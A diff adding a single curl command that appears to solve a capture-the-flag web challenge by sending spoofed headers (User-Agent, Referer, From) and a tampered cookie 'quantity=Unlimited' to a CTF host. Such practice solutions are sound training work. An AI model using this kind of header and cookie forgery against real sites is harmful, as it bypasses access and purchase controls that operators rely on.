@@ -1,0 +1,11 @@
+curl -X GET "http://challenges.ctf.compfest.id:9016/play" \
+  -H "Accept-Language: en-US" \
+  -H "Upgrade-Insecure-Requests: 1" \
+  -H "User-Agent: AgentYessir" \
+  -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7" \
+  -H "Referer: http://state.com" \
+  -H "Accept-Encoding: gzip, deflate, br" \
+  -H "Connection: keep-alive" \
+  -H "Cookie: quantity=Unlimited" \
+  -H "From: pinkus@cellmate.com" 
+
